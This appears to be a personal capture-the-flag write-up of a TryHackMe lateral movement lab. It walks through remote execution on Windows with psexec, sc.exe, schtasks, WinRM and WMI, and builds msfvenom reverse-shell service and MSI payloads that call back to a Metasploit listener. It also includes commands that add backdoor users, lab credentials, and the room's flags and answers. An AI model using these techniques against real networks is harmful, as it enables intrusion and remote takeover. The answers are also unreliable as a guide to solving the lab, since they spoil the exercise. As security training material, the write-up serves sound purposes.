Task1 - Introduction
---------------------------------------------

Setup DNS  and download Creds:
Username: tracey.turner Password: Letters1974

Task2 - Moving Through the Network
--------------------------------------------------------

This task discusses moving laterally through network using ssh/rdp etc to get to other hosts. This can provide some benefits such as alternate approach to attack, avoiding detection etc. 

Care must be taken though, it might not make sense for a dev user to be connecting to a finance PC or vice-versa.

UAC is imposed on local admins but not default administrator. Local admins cannot remotely connect to other machines for administrative tasks except an interactive session through rdp.


Task3 - Spawning Processes Remotely
-----------------------------------------------------------

In this task we will look at running processes remotely.

Psexec
* Port 445/tcp (SMB)
* Requires Group Membership in Administrators

The way it works:
1.  Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
2.  Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.
3.  Create some named pipes to handle stdin/stdout/stderr.

Format is:
```shell-session
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

We can do the same thing in Powershell but first we need a PSCredential object:

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

Then use this method to connect:
```powershell
Enter-PSSession -Computername TARGET -Credential $credential
```

Powershell also includes the Invoke-Command cmdlet which run scripts remote via WinRM. Be sure you have your PSCredential object setup 1st:

```powershell
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```

You can remotely create services with `sc`

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCE/RPC)
    -   445/TCP (RPC over SMB Named Pipes)
    -   139/TCP (RPC over SMB Named Pipes)
-   **Required Group Memberships:** Administrators

1. A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.

2. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).

Usage:
```shell-session
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

```shell-session
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```

Another thing we can do is schedule tasks remotely:

Startup:
```shell-session
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 

schtasks /s TARGET /run /TN "THMtask1" 
```

And stop/cleanup:
```shell-session
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

Ok let's SSH in using the credentials we got:

```
**User:** ZA.TRYHACKME.COM\t1_leonard.summers
**Password:** EZpass4ever
```

```shell-session
root@ip-10-10-63-136:~# ssh za\\leonard.summers@thmjmp2.za.tryhackme.com
The authenticity of host 'thmjmp2.za.tryhackme.com (10.200.64.249)' can't be established.
ECDSA key fingerprint is SHA256:mKpbr9DhO6i956GwbTAxqxfZnag5vDfb3u9I7LeD//o.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'thmjmp2.za.tryhackme.com,10.200.64.249' (ECDSA) to the list of known hosts.
za\leonard.summers@thmjmp2.za.tryhackme.com's password: 

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

za\leonard.summers@THMJMP2 C:\Users\leonard.summers>
```



Note that it is possible to spawn a reverse shell using these methods but the service executable will kill them almost immediately. To get around this we can use msfvenom and encap them in a fully functional service executable.

First we make an exe-service encapsulated reverse shell:
```bash
root@ip-10-10-63-136:~# msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.61.196 LPORT=4444 -o dabomb.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 341 bytes
Final size of exe-service file: 15872 bytes
Saved as: dabomb.exe
```

Now we place it on the server

```bash
C:\Windows\system32>hostname
hostname
THMJMP2

C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com create THMservice-4001 binPath= "%windir%\dabomb.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com create THMservice-4001 binPath= "%windir%\dabomb.exe" start= auto
[SC] CreateService SUCCESS

```

Setup msfconsole to wait for our reverse shell once we spawn it with the service we will be putting on the iis server.

```bash
root@ip-10-10-63-136:~# msfconsole
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use help <command> to learn more about any command

msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST lateralmovement
LHOST => lateralmovement
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.61.196:4444 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 10.200.64.201
[*] Command shell session 1 opened (10.50.61.196:4444 -> 10.200.64.201:62792) at 2022-11-09 05:04:42 +0000
```

You can also do a 1-liner:
```shell-session
$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
```


NOTE: we cannot use sc.exe to specifiy credentials we need to now spawn a new shell. we can use runas to spawn a new shell with t1_leonard.summers access token.

```shell-session
C:\Windows\system32>sc.exe \\thmiis.za.tryhackme.com start THMservice-4001 
sc.exe \\thmiis.za.tryhackme.com start THMservice-4001 

SERVICE_NAME: THMservice-4001 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4468
        FLAGS              : 
```

Catch the reverse shell we setup the listener with metaploit on 4444 earlier and then go to desktop of t1_leonard.summers to get the flag:

```shell-session
c:\Users\t1_leonard.summers\Desktop>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of c:\Users\t1_leonard.summers\Desktop

2022/06/17  17:41    <DIR>          .
2022/06/17  17:41    <DIR>          ..
2022/06/17  17:40            58\ufffd368 Flag.exe
               1 File(s)         58\ufffd368 bytes
               2 Dir(s)  46\ufffd532\ufffd075\ufffd520 bytes free

c:\Users\t1_leonard.summers\Desktop>Flag.exe
Flag.exe
THM{MOVING_WITH_SERVICES}
```

__Questions__

What is the user flag on t1_leonard.summers Desktop:
Answer: _THM{MOVING_WITH_SERVICES}_



Task4 - Moving Laterally Using WMI
---------------------------------------------------------

We can also do some techniques using Windows Management Instrumentation (WMI). This is the Windows version of Web-Based Enterprise Management (WBEM).

This tool allows admins to perform standard management tasks.

As before we need a PSCredential object in order to connect to WMI with powershell.

```powershell
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
```

-   **DCOM:** RPC over IP will be used for connecting to WMI. This protocol uses port 135/TCP and ports 49152-65535/TCP, just as explained when using sc.exe.
-   **Wsman:** WinRM will be used for connecting to WMI. This protocol uses ports 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS).

Use this to connect:
```powershell
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

## Remote Process Creation Using WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
        
-   **Required Group Memberships:** Administrators
- 
```powershell
$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}
```

Process is created silently without feedback.

For legacy systems:
```shell-session
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe" 
```

## Creating Services Remotely with WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-   **Required Group Memberships:** Administrators

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
```

Start service:
```powershell
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"

Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Stop Service:
```powershell
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

## Creating Scheduled Tasks Remotely with WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-   **Required Group Memberships:** Administrators

Create Scheduled Task:
```powershell
# Payload must be split in Command and Args
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

Delete Scheduled Task:
```powershell
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

## Installing MSI packages through WMI

-   **Ports:**
    -   135/TCP, 49152-65535/TCP (DCERPC)
    -   5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-   **Required Group Memberships:** Administrators

```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

And for legacy systems:
```shell-session
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```

## Let's go to town!

`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`

For this exercise, we will assume we have already captured some credentials with administrative access:

**User:** ZA.TRYHACKME.COM\t1_corine.waters
**Password:** Korine.1994

Generate a payload for msi type:
```bash
root@ip-10-10-63-136:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > dabomb.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
```

Upload it:
```bash
root@ip-10-10-63-136:~# smbclient -c 'put dabomb.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$' Korine.1994
WARNING: The "syslog" option is deprecated
putting file dabomb.msi as \dabomb.msi (1714.3 kb/s) (average 1714.3 kb/s)
```

Since we saved our payload to the ADMIN$ share it will be avail on C:\Windows\

Lets start a hander with metaploit:

```bash
Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services

msf5 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST lateralmovement
LHOST => lateralmovement
msf5 exploit(multi/handler) > set LPORT 4445
LPORT => 4445
msf5 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
payload => windows/x64/shell_reverse_tcp
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.50.61.196:4445 
```

```shell-session
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

Now we invoke it to start the msi install and start service for reverse shell:
```shell-session
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\dabomb.msi"; Options = ""; AllUsers = $false}
```

Now we catch our reverse shell in Meterpreter:
```bash
[*] Command shell session 1 opened (10.50.61.196:4445 -> 10.200.64.201:63626) at 2022-11-09 06:54:20 +0000



C:\Windows\system32>hostname
hostname
THMIIS
```

Now just go to Corines Desktop to get the flag:
```shell-session
C:\Windows\system32>cd C:\Users\t1_corine.waters\Desktop
cd C:\Users\t1_corine.waters\Desktop

C:\Users\t1_corine.waters\Desktop>dir
dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Users\t1_corine.waters\Desktop

2022/06/17  17:52    <DIR>          .
2022/06/17  17:52    <DIR>          ..
2022/06/17  17:52            58\ufffd368 Flag.exe
               1 File(s)         58\ufffd368 bytes
               2 Dir(s)  46\ufffd530\ufffd170\ufffd880 bytes free

C:\Users\t1_corine.waters\Desktop>Flag.exe
Flag.exe
THM{MOVING_WITH_WMI_4_FUN}


C:\Users\t1_corine.waters\Desktop>
```

__Questions__

What is the flag on t1_corine.waters Desktop?
Answer: _THM{MOVING_WITH_WMI_4_FUN}_



